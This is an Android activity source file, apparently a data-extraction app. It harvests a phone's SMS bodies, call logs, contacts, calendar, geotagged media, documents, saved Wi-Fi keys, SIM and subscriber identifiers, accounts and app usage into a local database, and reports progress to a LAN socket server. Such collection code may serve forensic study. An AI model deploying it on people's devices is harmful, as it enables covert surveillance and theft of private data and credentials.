package com.example.dataextraction;


import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Activity;
import android.app.usage.NetworkStats;
import android.app.usage.NetworkStatsManager;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.LinkAddress;
import android.net.LinkProperties;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.RouteInfo;
import android.net.Uri;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.provider.CalendarContract;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Telephony;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import java.io.File;
import java.net.InetAddress;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import androidx.core.content.ContextCompat;


import com.google.gson.JsonObject;

import org.json.JSONException;
import org.json.JSONObject;

import io.socket.client.IO;
import io.socket.client.Socket;

import static android.net.NetworkCapabilities.TRANSPORT_CELLULAR;

public class LoadingActivity extends Activity {

    private Socket socket;
    DBHelper dbHelper;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_loading);

        try {
            socket = IO.socket("http://192.168.0.8:3000/");
            socket.connect();
            Log.i("SOCKET", "Connected");

        }catch(Exception e){
            e.printStackTrace();
            Log.i("SOCKET", "Not Connected");
        }

        startLoading();
    }

    private void startLoading() {
        Handler handler = new Handler();
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                dbHelper = new DBHelper(getApplicationContext());
                dbHelper.open();

                getPhoto();
                alert("alert","photo");
                Log.i("MYLOG", "DB HY Part:1/14");
                getVideo();
                alert("alert","video");
                Log.i("MYLOG", "DB HY Part:2/14");
                getAudio();
                alert("alert","audio");
                Log.i("MYLOG", "DB HY Part:3/14");
                getCalendarInfo();
                alert("alert","calendar");
                Log.i("MYLOG", "DB HY Part:4/14");
                getNetworkInfo();
                alert("alert","network");
                Log.i("MYLOG", "DB HY Part:5/14");

                getCallLog();
                alert("alert","calllog");
                Log.i("MYLOG", "DB YM Part:6/14");
                getContact();
                alert("alert","contact");
                Log.i("MYLOG", "DB YM Part:7/14");
                getSMSMessage();
                alert("alert","sms");
                Log.i("MYLOG", "DB YM Part:8/14");
                getWIFI();
                alert("alert","wifi");
                Log.i("MYLOG", "DB YM Part:9/14");

                getPhoneInfo();
                alert("alert","phoneinfo");
                Log.i("MYLOG", "DB YY Part:10/14");
                getAccountInfo();
                alert("alert","accountinfo");
                Log.i("MYLOG", "DB YY Part:11/14");
                getAppInfo();
                alert("alert","appinfo");
                Log.i("MYLOG", "DB YY Part:12/14");
                getUsageStats();
                alert("alert","usagestats");
                Log.i("MYLOG", "DB YY Part:13/14");
                getDocument();
                Log.i("MYLOG", "DB YY Part:14/14");
                dbHelper.close();

                finish();

                alert("end", "end");

            }
        }, 2000);
    }

    public void getDocument() {

        String[] projection = {
                MediaStore.Files.FileColumns._ID,
                MediaStore.Files.FileColumns.MIME_TYPE,
                MediaStore.Files.FileColumns.DATE_ADDED,
                MediaStore.Files.FileColumns.DATE_MODIFIED,
                MediaStore.Files.FileColumns.DISPLAY_NAME,
                MediaStore.Files.FileColumns.TITLE,
                MediaStore.Files.FileColumns.SIZE,
                MediaStore.Files.FileColumns.DATA
        };

        String mimeType = "application/pdf";

        String whereClause = MediaStore.Files.FileColumns.MIME_TYPE + " IN ('" + mimeType + "')"
                + " OR " + MediaStore.Files.FileColumns.MIME_TYPE + " LIKE 'application/vnd%'";
        String orderBy = MediaStore.Files.FileColumns.SIZE + " DESC";
        Cursor cursor = getContentResolver().query(MediaStore.Files.getContentUri("external"),
                projection,
                whereClause,
                null,
                orderBy);

        int idCol = cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns._ID);
        int mimeCol = cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns.MIME_TYPE);
        int addedCol = cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DATE_ADDED);
        int modifiedCol = cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DATE_MODIFIED);
        int nameCol = cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DISPLAY_NAME);
        int titleCol = cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns.TITLE);
        int sizeCol = cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns.SIZE);
        int dataCol = cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DATA);

        if (cursor.moveToFirst()) {
            do {
                //Uri fileUri = Uri.withAppendedPath(MediaStore.Files.getContentUri("external"), cursor.getString(idCol));
                String mime = cursor.getString(mimeCol);
                long dateAdded = cursor.getLong(addedCol);
                long dateModified = cursor.getLong(modifiedCol);
                String name = cursor.getString(nameCol);
                String title = cursor.getString(titleCol);
                long size = cursor.getLong(sizeCol);
                String path = cursor.getString(dataCol);

                Log.i("documents", mime + ", " + dateAdded + ", " + dateModified + ", " + name + ", " + title + ", " + size + ", " + path);
                dbHelper.addDocumentInfo(cursor.getString(nameCol), cursor.getString(titleCol), cursor.getLong(addedCol)
                        , cursor.getLong(modifiedCol), cursor.getString(mimeCol), cursor.getString(dataCol),String.valueOf(cursor.getLong(sizeCol)));
            } while (cursor.moveToNext());
        }
    }

    public void getPhoto() {
        Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        String[] projection = new String[]{
                MediaStore.Images.Media.TITLE,
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DATE_ADDED,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.MIME_TYPE,
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.LATITUDE,
                MediaStore.Images.Media.LONGITUDE
        };
        Cursor cursor = getContentResolver().query(uri, projection, null, null, null);


        while (cursor.moveToNext()) {
            photoItem photo = new photoItem();
            photo.setTitle(cursor.getString(0));
            photo.setId(cursor.getInt(1));
            photo.setDate(cursor.getString(2));
            photo.setDisplayName(cursor.getString(3));
            photo.setType(cursor.getString(4));
            photo.setPath(cursor.getString(5));
            photo.setLatitude(cursor.getString(6));
            photo.setLongitude(cursor.getString(7));


            File f = new File(cursor.getString(5));
            long size = f.length();

            dbHelper.insertPColumn(photo.getTitle(), photo.getId(), photo.getDate()
                    , photo.getDisplayName(), photo.getType(), photo.getPath()
                    , photo.getLatitude(), photo.getLongitude(),String.valueOf(size));
        }

    }

    public void getVideo() {
        Uri uri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;

        String[] projection = new String[]{
                MediaStore.Video.Media.ALBUM,
                MediaStore.Video.Media.ARTIST,
                MediaStore.Video.Media.BOOKMARK,
                MediaStore.Video.Media.CATEGORY,
                MediaStore.Video.Media.DESCRIPTION,
                MediaStore.Video.Media.LANGUAGE,
                MediaStore.Video.Media.LATITUDE,
                MediaStore.Video.Media.LONGITUDE,
                MediaStore.Video.Media.RESOLUTION,
                MediaStore.Video.Media.DATA,
                MediaStore.Video.Media.TAGS,
                MediaStore.Video.Media.DATE_ADDED,
                MediaStore.Video.Media.DISPLAY_NAME,
                MediaStore.Video.Media.MIME_TYPE,
                MediaStore.Video.Media.TITLE,
        };

        Cursor cursor = getContentResolver().query(uri, projection, null, null, null);

        while (cursor.moveToNext()) {
            videoItem video = new videoItem();

            video.setAlbum(cursor.getString(0));
            video.setArtist(cursor.getString(1));
            video.setBookmark(cursor.getString(2));
            video.setCategory(cursor.getString(3));
            video.setDescription(cursor.getString(4));
            video.setLanguage(cursor.getString(5));
            video.setLatitude(cursor.getString(6));
            video.setLongitude(cursor.getString(7));
            video.setResolution(cursor.getString(8));
            video.setPath(cursor.getString(9));
            video.setTags(cursor.getString(10));
            video.setDate_added(cursor.getString(11));
            video.setDisplay_Name(cursor.getString(12));
            video.setMIME_type(cursor.getString(13));
            video.setTitle(cursor.getString(14));

            File f = new File(cursor.getString(9));
            long size = f.length();

            dbHelper.insertVColumn(video.getTitle(), video.getDate_added(), video.getDisplay_Name()
                    , video.getMIME_type(), video.getPath(), video.getLatitude(), video.getLongitude()
                    , video.getAlbum(), video.getArtist(), video.getBookmark(), video.getCategory()
                    , video.getDescription(), video.getLanguage(), video.getResolution(), video.getTags(), String.valueOf(size));
        }
    }

    public void getAudio() {
        Uri uri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI;

        String[] projection = new String[]{
                MediaStore.Audio.Media.ALBUM,
                MediaStore.Audio.Media.ARTIST,
                MediaStore.Audio.Media.COMPOSER,
                MediaStore.Audio.Media.YEAR,
                MediaStore.Audio.Media.DATA,
                MediaStore.Audio.Media.DATE_ADDED,
                MediaStore.Audio.Media.MIME_TYPE,
                MediaStore.Audio.Media.SIZE,
                MediaStore.Audio.Media.TITLE,
        };

        Cursor cursor = getContentResolver().query(uri, projection, null, null, null);

        while (cursor.moveToNext()) {
            audioItem audio = new audioItem();
            audio.setAlbum(cursor.getString(0));
            audio.setArtist(cursor.getString(1));
            audio.setComposer(cursor.getString(2));
            audio.setYear(cursor.getString(3));
            audio.setPath(cursor.getString(4));
            audio.setDate_added(cursor.getString(5));
            audio.setMIME_TYPE(cursor.getString(6));
            audio.setSize(cursor.getString(7));
            audio.setTitle(cursor.getString(8));

            dbHelper.insertAColumn(audio.getTitle(), audio.getDate_added(), audio.getMIME_TYPE()
                    , audio.getPath(), audio.getAlbum(), audio.getArtist(), audio.getComposer()
                    ,audio.getYear(), audio.getSize());
        }

    }

    private void getCalendarInfo() {
        ArrayList<calendarItem> calendarList = new ArrayList<>();

        Cursor cur = null;
        ContentResolver cr = getContentResolver();
        Uri uri = CalendarContract.Calendars.CONTENT_URI;

        if (checkSelfPermission(Manifest.permission.READ_CALENDAR) != PackageManager.PERMISSION_GRANTED) {
            Toast.makeText(getApplicationContext(), "권한문제", Toast.LENGTH_LONG).show();
            return;
        }

        String[] event_projection = new String[]{
                CalendarContract.Calendars._ID,                           // 0
                CalendarContract.Calendars.ACCOUNT_NAME,                  // 1
                CalendarContract.Calendars.CALENDAR_DISPLAY_NAME,         // 2
                CalendarContract.Calendars.OWNER_ACCOUNT                  // 3
        };

        cur = cr.query(uri, event_projection, null, null, null);

        // Use the cursor to step through the returned records
        while (cur.moveToNext()) {

            long calID = 0;
            String displayName = null;
            String accountName = null;
            String ownerName = null;

            // Get the field values
            calID = cur.getLong(0);
            displayName = cur.getString(1);
            accountName = cur.getString(2);
            ownerName = cur.getString(3);

            Cursor cure = null;
            ContentResolver cre = getContentResolver();
            Uri urie = CalendarContract.Events.CONTENT_URI;

            String[] event_projection2 = new String[]{
                    CalendarContract.Events.CALENDAR_ID,                    //0
                    CalendarContract.Events.TITLE,                          // 2
                    CalendarContract.Events.EVENT_LOCATION,                 // 3
                    CalendarContract.Events.DESCRIPTION,                    // 4
                    CalendarContract.Events.DTSTART,                        // 5
                    CalendarContract.Events.DTEND,                          // 6
                    CalendarContract.Events.DURATION,                       // 9
                    CalendarContract.Events.ALL_DAY,                        // 10
                    CalendarContract.Events.RRULE,                          // 11
                    CalendarContract.Events.RDATE                           // 12
            };

            cure = cre.query(urie, event_projection2, null, null, null);
            while (cure.moveToNext()) {
                String calid = null;
                String title = null;
                String loc = null;
                String desc = null;
                long dtstart = 0;
                long dtend = 0;
                String duration = null;
                String all_day = null;
                String rrule = null;
                String rdate = null;

                calid = cure.getString(0);
                title = cure.getString(1);
                loc = cure.getString(2);
                desc = cure.getString(3);
                dtstart = cure.getLong(4);
                dtend = cure.getLong(5);
                duration = cure.getString(6);
                all_day = cure.getString(7);
                rrule = cure.getString(8);
                rdate = cure.getString(9);

                DateFormat timeFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                Date start = new Date(dtstart);
                Date end = new Date(dtend);

                //save
                if (calID == Integer.parseInt(calid)) {
                    calendarItem calendar = new calendarItem();

                    calendar.setCalID(Long.toString(calID));
                    calendar.setDisplayName(displayName);
                    calendar.setAccountName(accountName);
                    calendar.setOwnerName(ownerName);
                    calendar.setTitle(title);
                    calendar.setLoc(loc);
                    calendar.setDesc(desc);
                    calendar.setDtstart(timeFormat.format(start));
                    calendar.setDtend(timeFormat.format(end));
                    calendar.setDuration(duration);
                    calendar.setAllday(all_day);
                    calendar.setRrule(rrule);
                    calendar.setRdate(rdate);

                    dbHelper.insertCColumn(calendar.getTitle(), calendar.getCalID(), calendar.getLoc()
                            , calendar.getDesc(), calendar.getDtstart(), calendar.getDtend(), calendar.getDuration()
                            , calendar.getAllday(), calendar.getDisplayName(), calendar.getAccountName()
                            , calendar.getOwnerName(), calendar.getRrule(), calendar.getRdate());
                }
            }
        }

    }

    public void getNetworkInfo(){
        ConnectivityManager connectivityManager;
        LinkProperties linkProperties;
        connectivityManager = (ConnectivityManager) this.getSystemService(Context.CONNECTIVITY_SERVICE);
        Network[] networkList = connectivityManager.getAllNetworks();
        networkDBHelper dbNHelper = new networkDBHelper(getApplicationContext());
        dbNHelper.open();
        dbNHelper.deleteAllRows();
        for(Network network : networkList){
            NetworkCapabilities capabilities = connectivityManager.getNetworkCapabilities(network);
            if(capabilities != null){
                if(capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)){
                    linkProperties = connectivityManager.getLinkProperties(network);
                    String domain = linkProperties.getDomains();
                    String interfacrName = linkProperties.getInterfaceName();
                    //String DnsServerName = linkProperties.getPrivateDnsServerName();
                    dbNHelper.insertColumn0(network.toString(), domain, interfacrName);
                    List<InetAddress> inetAddresses = linkProperties.getDnsServers();
                    for(InetAddress address : inetAddresses){
                        dbNHelper.insertColumn1(network.toString(), address.getHostAddress());
                    }
                    List<LinkAddress> linkAddresses = linkProperties.getLinkAddresses();
                    for(LinkAddress address : linkAddresses) {
                        dbNHelper.insertColumn2(network.toString(), address.getAddress().getHostAddress(), address.getPrefixLength());
                    }
                    List<RouteInfo> routeInfos = linkProperties.getRoutes();
                    for(RouteInfo routeinfo : routeInfos){
                        dbNHelper.insertColumn3(network.toString(), routeinfo.getDestination().toString()
                                , routeinfo.getDestination().getPrefixLength(), routeinfo.getGateway().toString()
                                ,routeinfo.getInterface());
                    }
                }
            }
        }
        dbNHelper.close();
    }
//    private class GoogleAppIdTask extends AsyncTask<Void, Void, String> {
//        protected String doInBackground(final Void... params) {
//            String adId = null;
//            try {
//                AdvertisingIdClient.Info advertisingIdInfo = AdvertisingIdClient.getAdvertisingIdInfo(getApplicationContext());
//                adId = advertisingIdInfo.getId();
//                if (!advertisingIdInfo.isLimitAdTrackingEnabled())
//                    Log.d("adid : ", adId);
//            } catch (IllegalStateException ex) {
//                ex.printStackTrace();
//                Log.e("GoogleAppidTask","IllegalStateException");
//            } catch (GooglePlayServicesRepairableException ex) {
//                ex.printStackTrace();
//                Log.e("GoogleAppidTask","GooglePlayServicesRepairable Exception");
//            } catch (IOException ex) {
//                ex.printStackTrace();
//                Log.e("GoogleAppidTask","IOException");
//            } catch (GooglePlayServicesNotAvailableException ex) {
//                ex.printStackTrace();
//                Log.e("GoogleAppidTask","GooglePlayServicesNotAvailableException");
//            }
//            return adId;
//        }
//
//        protected void onPostExecute(String adId) {
//            //작업 수행
//        }
//    }

    public void getPhoneInfo(){
        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            Toast.makeText(getApplicationContext(), "권한문제", Toast.LENGTH_LONG).show();
        }

        String adid = "";
//        try {
//            MainActivity.GoogleAppIdTask asyncTask = new MainActivity.GoogleAppIdTask();
//            adid = asyncTask.execute().get();
//        }catch(Exception e){
//            e.printStackTrace();
//        }

        dbHelper.addPhoneInfo(tm.getPhoneType(), tm.getDeviceSoftwareVersion(),
                tm.getLine1Number(), tm.getSubscriberId(), adid, tm.getCallState(),
                tm.getDataState(),tm.getNetworkType(),tm.getNetworkCountryIso(),
                tm.getSimCountryIso(),tm.getNetworkOperator(),tm.getSimOperator(),
                tm.getNetworkOperatorName(),tm.getSimOperatorName() ,tm.getSimSerialNumber(),
                tm.getSimState(),tm.isNetworkRoaming());


    }

    public void getAccountInfo(){

        AccountManager am = AccountManager.get(this);
        Account[] accounts = am.getAccounts();

        for(Account account : accounts) {
            dbHelper.addAccountInfo(account.name,account.type);
            //String password=accountManager.getPassword(account);
        }
    }

    public void getAppInfo() {

        PackageManager pm = getPackageManager();
        List<PackageInfo> packages = pm.getInstalledPackages(PackageManager.GET_META_DATA);
        ApplicationInfo applicationInfo;
        NetworkStatsManager networkStatsManager = (NetworkStatsManager) getSystemService(Context.NETWORK_STATS_SERVICE);


        for (PackageInfo packageInfo : packages) {
            try {
                applicationInfo = pm.getApplicationInfo(packageInfo.packageName, 0);
            } catch (final PackageManager.NameNotFoundException e) {
                applicationInfo = null;
            }
            String applicationName = (String) (applicationInfo != null ? pm.getApplicationLabel(applicationInfo) : "(unknown)");


            NetworkStats wifinetworkStats = null;
            NetworkStats mobilenetworkStats = null;
            try {
                wifinetworkStats = networkStatsManager.queryDetailsForUid(NetworkCapabilities.TRANSPORT_WIFI, "", 0, System.currentTimeMillis(), applicationInfo.uid);
            } catch (Exception e) {
                wifinetworkStats = null;
            }
            try {
                Context context = getApplicationContext();
                String subscribedId = getSubscriberId(TRANSPORT_CELLULAR);
                mobilenetworkStats = networkStatsManager.queryDetailsForUid(NetworkCapabilities.TRANSPORT_CELLULAR, subscribedId, 0, System.currentTimeMillis(), applicationInfo.uid);
            } catch (Exception e) {
                mobilenetworkStats = null;
            }

            NetworkStats.Bucket wifibucket = new NetworkStats.Bucket();
            long wifirxbytes = 0;
            long wifitxbytes = 0;
            while (wifinetworkStats.hasNextBucket()) {
                wifinetworkStats.getNextBucket(wifibucket);
                wifirxbytes += wifibucket.getRxBytes();
                wifitxbytes += wifibucket.getTxBytes();
            };

            NetworkStats.Bucket cellularbucket = new NetworkStats.Bucket();
            long cellrxbytes = 0;
            long celltxbytes = 0;
            while (mobilenetworkStats.hasNextBucket()) {
                mobilenetworkStats.getNextBucket(cellularbucket);
                cellrxbytes += cellularbucket.getRxBytes();
                celltxbytes += cellularbucket.getTxBytes();
            };
            mobilenetworkStats.getNextBucket(cellularbucket);

            dbHelper.addAppInfo(packageInfo.packageName,packageInfo.versionName, applicationName,packageInfo.firstInstallTime, packageInfo.lastUpdateTime, wifirxbytes+wifitxbytes, cellrxbytes+celltxbytes);
        }

    }

    private String getSubscriberId(int networkType) {
        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            Toast.makeText(getApplicationContext(), "권한문제", Toast.LENGTH_LONG).show();
            return null;
        }
        else {
            if (ConnectivityManager.TYPE_MOBILE == networkType) {
                return tm.getSubscriberId();
            }
        }
        return "";
    }

    public void getUsageStats() {

        UsageStatsManager usageStatsManager = (UsageStatsManager) getSystemService(Context.USAGE_STATS_SERVICE);

        List<UsageStats> queryUsageStats = usageStatsManager.queryUsageStats(UsageStatsManager.INTERVAL_YEARLY, 0, System.currentTimeMillis());
        for (UsageStats usagestat : queryUsageStats) {
            dbHelper.addAppUsage_YEAR(usagestat.getPackageName(),usagestat.getFirstTimeStamp(),  usagestat.getLastTimeStamp(),usagestat.getLastTimeUsed(), usagestat.getTotalTimeInForeground());
        }

        queryUsageStats = usageStatsManager.queryUsageStats(UsageStatsManager.INTERVAL_MONTHLY, 0, System.currentTimeMillis());
        for (UsageStats usagestat : queryUsageStats) {
            dbHelper.addAppUsage_MONTH(usagestat.getPackageName(),usagestat.getFirstTimeStamp(),  usagestat.getLastTimeStamp(),usagestat.getLastTimeUsed(), usagestat.getTotalTimeInForeground());
        }

        queryUsageStats = usageStatsManager.queryUsageStats(UsageStatsManager.INTERVAL_WEEKLY, 0, System.currentTimeMillis());
        for (UsageStats usagestat : queryUsageStats) {
            dbHelper.addAppUsage_WEEK(usagestat.getPackageName(),usagestat.getFirstTimeStamp(),  usagestat.getLastTimeStamp(),usagestat.getLastTimeUsed(), usagestat.getTotalTimeInForeground());
        }
        queryUsageStats = usageStatsManager.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, 0,
                System.currentTimeMillis());
        for (UsageStats usagestat : queryUsageStats) {
            dbHelper.addAppUsage_DAY(usagestat.getPackageName(),usagestat.getFirstTimeStamp(),  usagestat.getLastTimeStamp(),usagestat.getLastTimeUsed(), usagestat.getTotalTimeInForeground());
        }

    }


    public void getCallLog(){

        int permissionCheck = ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_CALL_LOG);

        Uri uri = CallLog.Calls.CONTENT_URI;

        if(permissionCheck == PackageManager.PERMISSION_GRANTED) {
            Cursor cursor = getBaseContext().getContentResolver().query(uri, null, null, null, CallLog.Calls.DEFAULT_SORT_ORDER);

            if(cursor.getCount() > 0){
                while(cursor.moveToNext()){
                    //1:수신, 2:발신, 3:부재중
                    String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                    //이름
                    String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                    //번호
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    //통화시간
                    String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                    //날짜
                    long date_long = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
                    DateFormat timeFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                    Date date = new Date(date_long);

                    //db에 추가
                    dbHelper.insertCallLogColumn(type, name, number, duration, timeFormat.format(date));

                }
            }
        }
    }

    public void getContact(){
        Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;

        String[] projection = new String[]{
                ContactsContract.CommonDataKinds.Phone.NUMBER,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.Contacts.PHOTO_ID,
                ContactsContract.Contacts._ID
        };

        String sortOrder = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " COLLATE LOCALIZED ASC";

        Cursor cursor = getContentResolver().query(uri,projection,null,null,sortOrder);

        if(cursor.moveToFirst()){
            do{
                //전화번호
                String number = cursor.getString(0);
                //이름
                String name = cursor.getString(1);
                String photo_id = cursor.getString(2);
                String person_id = cursor.getString(3);

                //name, number 중복하는거 거르기
                //db에 추가
                dbHelper.insertContactColumn(number, name, photo_id, person_id);

            }while(cursor.moveToNext());
        }
    }

    public void getSMSMessage(){
        Uri uri = Telephony.Sms.CONTENT_URI;
        String[] projection = new String[]{
                "type","_id","thread_id","address","person","creator","date","body","read"
        };
        Cursor cursor = getContentResolver().query(uri,projection, null,null,"date DESC");

        while(cursor.moveToNext()){
            //Telephony.Sms.MESSAGE_TYPE_INBOX 받은 메시지/Telephony.Sms.MESSAGE_TYPE_SENT 보낸 메시지
            String type = cursor.getString(0);
            //메세지 id
            String mid = cursor.getString(1);
            //특정 사용자와 대화의 공통 id
            String tid = cursor.getString(2);
            //주소 번호
            String address = cursor.getString(3);
            //누가 보냈는지 contact
            //Telephony.Sms.MESSAGE_TYPE_INBOX only
            String person = cursor.getString(4);
            //Telephony.Sms.MESSAGE_TYPE_SENT only
            String creator = cursor.getString(5);
            //시간 ms
            Long date_long = cursor.getLong(6);
            DateFormat timeFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            String date = timeFormat.format(date_long);
            //내용
            String body = cursor.getString(7);
            //사용자가 메시지 읽었으면 1, 안 읽었으면 0
            String read = cursor.getString(8);

            //db에 추가
            dbHelper.insertSMSColumn(mid, tid, type, address, person, creator, date, body, read);
        }
    }

    public void getWIFI(){
        WifiManager wm = (WifiManager)getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        //네트워크 설정 목록 획득
        List<WifiConfiguration> configurations = wm.getConfiguredNetworks();
        if(configurations != null){
            for(final WifiConfiguration config : configurations){
                //network id
                int i_id = config.networkId;
                String id = Integer.toString(i_id);
                //wifi 이름
                String ssid = config.SSID;
                //mac 주소
                String bssid = config.BSSID;
                //신호강도 (level)
                //연결 password
                String[] wepkeys = config.wepKeys;

                //db에 추가
                dbHelper.insertWifiColumn(id, ssid, bssid, wepkeys[0]);
            }
        }
    }


    public void alert(String type, String message){

        JsonObject alertJsonObject = new JsonObject();
        alertJsonObject.addProperty("comment", message);
        JSONObject jsonObject = null;

        try{
            jsonObject = new JSONObject(alertJsonObject.toString());
        }catch(JSONException e){
            e.printStackTrace();
        }

        socket.emit(type, jsonObject);

    }

}
